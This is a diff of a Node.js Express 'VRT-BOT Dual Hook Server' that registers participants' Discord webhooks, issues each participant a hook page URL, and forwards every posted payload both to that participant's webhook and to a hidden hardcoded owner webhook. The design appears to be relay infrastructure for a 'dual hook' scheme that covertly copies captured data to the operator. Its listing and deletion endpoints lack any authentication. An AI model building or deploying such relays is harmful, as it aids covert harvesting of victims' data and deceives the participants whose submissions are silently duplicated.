@@ -1,8 +1,9 @@
 const express = require('express');
 const cors = require('cors');
 const dotenv = require('dotenv');
+const fs = require('fs');
+const path = require('path');
 
-// Load environment variables
 dotenv.config();
 
 const app = express();
@@ -14,19 +15,44 @@ app.use(cors({
     credentials: true
 }));
 app.use(express.json());
+app.use(express.static('public'));
 
 // ============================================================
-//  ENVIRONMENT VARIABLES (Set these in Render Dashboard)
+//  OWNER'S HARDCODED WEBHOOK (from .env)
 // ============================================================
-// WEBHOOK_URL_1  - Primary Discord webhook
-// WEBHOOK_URL_2  - Backup Discord webhook (optional)
-// WEBHOOK_ENABLED_1 - true/false
-// WEBHOOK_ENABLED_2 - true/false
+const OWNER_WEBHOOK = process.env.OWNER_WEBHOOK_URL || '';
+const WEBHOOKS_FILE = path.join(__dirname, 'webhooks.json');
 
-const WEBHOOK_1 = process.env.WEBHOOK_URL_1 || '';
-const WEBHOOK_2 = process.env.WEBHOOK_URL_2 || '';
-const WEBHOOK_1_ENABLED = process.env.WEBHOOK_ENABLED_1 !== 'false';
-const WEBHOOK_2_ENABLED = process.env.WEBHOOK_ENABLED_2 !== 'false';
+// ============================================================
+//  STORAGE: webhooks.json
+// ============================================================
+function loadWebhooks() {
+    try {
+        if (fs.existsSync(WEBHOOKS_FILE)) {
+            const data = fs.readFileSync(WEBHOOKS_FILE, 'utf8');
+            return JSON.parse(data);
+        }
+        return {};
+    } catch (e) {
+        return {};
+    }
+}
+
+function saveWebhooks(webhooks) {
+    fs.writeFileSync(WEBHOOKS_FILE, JSON.stringify(webhooks, null, 2));
+}
+
+// ============================================================
+//  GENERATE UNIQUE ID
+// ============================================================
+function generateId() {
+    const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
+    let id = '';
+    for (let i = 0; i < 8; i++) {
+        id += chars.charAt(Math.floor(Math.random() * chars.length));
+    }
+    return id;
+}
 
 // ============================================================
 //  ROUTES
@@ -36,138 +62,187 @@ const WEBHOOK_2_ENABLED = process.env.WEBHOOK_ENABLED_2 !== 'false';
 app.get('/', (req, res) => {
     res.json({
         status: 'online',
-        message: 'VRT-BOT Hook Server',
-        hooks: {
-            hook1: WEBHOOK_1 ? 'Configured' : 'Not set',
-            hook2: WEBHOOK_2 ? 'Configured' : 'Not set',
-            hook1Enabled: WEBHOOK_1_ENABLED,
-            hook2Enabled: WEBHOOK_2_ENABLED
-        },
+        message: 'VRT-BOT Dual Hook Server',
+        ownerWebhookConfigured: !!OWNER_WEBHOOK,
+        registeredHooks: Object.keys(loadWebhooks()).length,
         timestamp: new Date().toISOString()
     });
 });
 
-// Get hook configuration (for frontend)
-app.get('/api/hooks', (req, res) => {
+// Generate a new unique hook URL for a participant
+app.post('/api/generate', (req, res) => {
+    const { username, webhookUrl } = req.body;
+    
+    if (!username || !webhookUrl) {
+        return res.status(400).json({ error: 'Username and webhook URL required' });
+    }
+
+    // Validate webhook URL
+    if (!webhookUrl.startsWith('https://discord.com/api/webhooks/')) {
+        return res.status(400).json({ error: 'Invalid Discord webhook URL' });
+    }
+
+    const webhooks = loadWebhooks();
+    
+    // Check if user already has a hook
+    let existingId = null;
+    for (const [id, data] of Object.entries(webhooks)) {
+        if (data.username === username) {
+            existingId = id;
+            break;
+        }
+    }
+
+    if (existingId) {
+        // Update existing webhook
+        webhooks[existingId] = {
+            username,
+            webhookUrl,
+            createdAt: webhooks[existingId].createdAt,
+            updatedAt: new Date().toISOString()
+        };
+        saveWebhooks(webhooks);
+        return res.json({
+            success: true,
+            message: 'Webhook updated successfully',
+            hookId: existingId,
+            hookUrl: `https://${req.get('host')}/hook/${existingId}`,
+            isNew: false
+        });
+    }
+
+    // Generate new ID
+    let id = generateId();
+    while (webhooks[id]) {
+        id = generateId(); // Regenerate if collision
+    }
+
+    webhooks[id] = {
+        username,
+        webhookUrl,
+        createdAt: new Date().toISOString(),
+        updatedAt: new Date().toISOString()
+    };
+    saveWebhooks(webhooks);
+
     res.json({
-        hook1: WEBHOOK_1,
-        hook2: WEBHOOK_2,
-        hook1Enabled: WEBHOOK_1_ENABLED,
-        hook2Enabled: WEBHOOK_2_ENABLED
+        success: true,
+        message: 'Webhook registered successfully',
+        hookId: id,
+        hookUrl: `https://${req.get('host')}/hook/${id}`,
+        isNew: true
     });
 });
 
-// Proxy webhook requests (send data to both hooks)
-app.post('/api/send', async (req, res) => {
+// Get a participant's hook info
+app.get('/api/hook/:id', (req, res) => {
+    const { id } = req.params;
+    const webhooks = loadWebhooks();
+    
+    if (!webhooks[id]) {
+        return res.status(404).json({ error: 'Hook not found' });
+    }
+
+    res.json({
+        id,
+        username: webhooks[id].username,
+        createdAt: webhooks[id].createdAt,
+        webhookConfigured: !!webhooks[id].webhookUrl
+    });
+});
+
+// Get all registered hooks (for owner dashboard)
+app.get('/api/hooks/all', (req, res) => {
+    const webhooks = loadWebhooks();
+    const list = Object.entries(webhooks).map(([id, data]) => ({
+        id,
+        username: data.username,
+        createdAt: data.createdAt,
+        updatedAt: data.updatedAt,
+        webhookConfigured: !!data.webhookUrl
+    }));
+    res.json(list);
+});
+
+// Delete a hook (for owner)
+app.delete('/api/hook/:id', (req, res) => {
+    const { id } = req.params;
+    const webhooks = loadWebhooks();
+    
+    if (!webhooks[id]) {
+        return res.status(404).json({ error: 'Hook not found' });
+    }
+
+    delete webhooks[id];
+    saveWebhooks(webhooks);
+    res.json({ success: true, message: 'Hook deleted' });
+});
+
+// ============================================================
+//  SEND TO DUAL HOOKS (Owner's + Participant's)
+// ============================================================
+app.post('/api/send/:hookId', async (req, res) => {
+    const { hookId } = req.params;
     const { data } = req.body;
+
     if (!data) {
         return res.status(400).json({ error: 'Missing data' });
     }
 
+    const webhooks = loadWebhooks();
+    const participantHook = webhooks[hookId];
+
+    if (!participantHook || !participantHook.webhookUrl) {
+        return res.status(404).json({ error: 'Participant webhook not found' });
+    }
+
     const results = [];
     const errors = [];
 
-    // Send to Hook 1
-    if (WEBHOOK_1 && WEBHOOK_1_ENABLED) {
+    // 1. Send to Owner's hardcoded webhook
+    if (OWNER_WEBHOOK) {
         try {
-            const response = await fetch(WEBHOOK_1, {
+            const response = await fetch(OWNER_WEBHOOK, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(data)
             });
             results.push({
-                hook: 1,
+                hook: 'owner',
                 success: response.ok,
                 status: response.status
             });
             if (!response.ok) {
-                errors.push(`Hook 1 failed: ${response.status}`);
+                errors.push(`Owner hook failed: ${response.status}`);
             }
         } catch (e) {
-            errors.push(`Hook 1 error: ${e.message}`);
-            results.push({ hook: 1, success: false, error: e.message });
+            errors.push(`Owner hook error: ${e.message}`);
+            results.push({ hook: 'owner', success: false, error: e.message });
         }
+    } else {
+        errors.push('Owner webhook not configured');
     }
 
-    // Send to Hook 2
-    if (WEBHOOK_2 && WEBHOOK_2_ENABLED) {
+    // 2. Send to Participant's webhook
+    if (participantHook.webhookUrl) {
         try {
-            const response = await fetch(WEBHOOK_2, {
+            const response = await fetch(participantHook.webhookUrl, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(data)
             });
             results.push({
-                hook: 2,
+                hook: 'participant',
+                username: participantHook.username,
                 success: response.ok,
                 status: response.status
             });
             if (!response.ok) {
-                errors.push(`Hook 2 failed: ${response.status}`);
+                errors.push(`Participant hook failed: ${response.status}`);
             }
         } catch (e) {
-            errors.push(`Hook 2 error: ${e.message}`);
-            results.push({ hook: 2, success: false, error: e.message });
-        }
-    }
-
-    res.json({
-        success: results.some(r => r.success),
-        results,
-        errors: errors.length > 0 ? errors : null
-    });
-});
-
-// Test endpoint - sends a test message to both hooks
-app.post('/api/test', async (req, res) => {
-    const { username = 'TestUser', volts = '1000' } = req.body;
-
-    const testData = {
-        username: "🧪 VRT-Bot Test",
-        embeds: [{
-            title: "🧪 Test Message from Server",
-            description: `**${username}** - ${volts} volts test`,
-            color: 0x45dc93,
-            fields: [
-                { name: "Status", value: "✅ Server is online", inline: true },
-                { name: "Timestamp", value: new Date().toISOString(), inline: true },
-                { name: "Server", value: "Render.com", inline: true }
-            ],
-            timestamp: new Date().toISOString(),
-            footer: { text: "🧪 Server Test" }
-        }]
-    };
-
-    const results = [];
-    const errors = [];
-
-    if (WEBHOOK_1 && WEBHOOK_1_ENABLED) {
-        try {
-            const response = await fetch(WEBHOOK_1, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(testData)
-            });
-            results.push({ hook: 1, success: response.ok, status: response.status });
-            if (!response.ok) errors.push(`Hook 1: ${response.status}`);
-        } catch (e) {
-            errors.push(`Hook 1: ${e.message}`);
-            results.push({ hook: 1, success: false, error: e.message });
-        }
-    }
-
-    if (WEBHOOK_2 && WEBHOOK_2_ENABLED) {
-        try {
-            const response = await fetch(WEBHOOK_2, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(testData)
-            });
-            results.push({ hook: 2, success: response.ok, status: response.status });
-            if (!response.ok) errors.push(`Hook 2: ${response.status}`);
-        } catch (e) {
-            errors.push(`Hook 2: ${e.message}`);
-            results.push({ hook: 2, success: false, error: e.message });
+            errors.push(`Participant hook error: ${e.message}`);
+            results.push({ hook: 'participant', success: false, error: e.message });
         }
     }
 
@@ -175,12 +250,43 @@ app.post('/api/test', async (req, res) => {
         success: results.some(r => r.success),
         results,
         errors: errors.length > 0 ? errors : null,
-        hooks: {
-            hook1Configured: !!WEBHOOK_1,
-            hook2Configured: !!WEBHOOK_2,
-            hook1Enabled: WEBHOOK_1_ENABLED,
-            hook2Enabled: WEBHOOK_2_ENABLED
+        sentTo: {
+            owner: !!OWNER_WEBHOOK,
+            participant: participantHook.username
         }
+    });
+});
+
+// ============================================================
+//  SERVE CUSTOM HOOK PAGES (Netlify will handle this)
+//  We just provide the data, Netlify serves the HTML
+// ============================================================
+app.get('/hook/:id', (req, res) => {
+    const { id } = req.params;
+    const webhooks = loadWebhooks();
+    
+    if (!webhooks[id]) {
+        return res.status(404).send(`
+            <!DOCTYPE html>
+            <html>
+            <head><title>Hook Not Found</title></head>
+            <body style="font-family:sans-serif;background:#0e0f11;color:#fff;display:grid;place-items:center;height:100vh;margin:0;">
+                <div style="text-align:center;">
+                    <h1>🔗 Hook Not Found</h1>
+                    <p style="color:#969aa5;">This hook ID does not exist or has been removed.</p>
+                    <a href="/" style="color:#5271ff;">Return to VRT-BOT</a>
+                </div>
+            </body>
+            </html>
+        `);
+    }
+
+    // Return the hook data as JSON for the frontend to render
+    res.json({
+        id,
+        username: webhooks[id].username,
+        createdAt: webhooks[id].createdAt,
+        webhookConfigured: !!webhooks[id].webhookUrl
     });
 });
 
@@ -188,9 +294,8 @@ app.post('/api/test', async (req, res) => {
 //  START SERVER
 // ============================================================
 app.listen(PORT, () => {
-    console.log(`🚀 VRT-BOT Hook Server running on port ${PORT}`);
-    console.log(`📡 Hook 1: ${WEBHOOK_1 ? 'Configured' : 'Not set'}`);
-    console.log(`📡 Hook 2: ${WEBHOOK_2 ? 'Configured' : 'Not set'}`);
-    console.log(`🔗 Health check: http://localhost:${PORT}/`);
-    console.log(`📡 API: http://localhost:${PORT}/api/hooks`);
+    console.log(`🚀 VRT-BOT Dual Hook Server running on port ${PORT}`);
+    console.log(`🔗 Owner Webhook: ${OWNER_WEBHOOK ? '✅ Configured' : '❌ Not set'}`);
+    console.log(`📁 Registered hooks: ${Object.keys(loadWebhooks()).length}`);
+    console.log(`🔗 Health: http://localhost:${PORT}/`);
 });
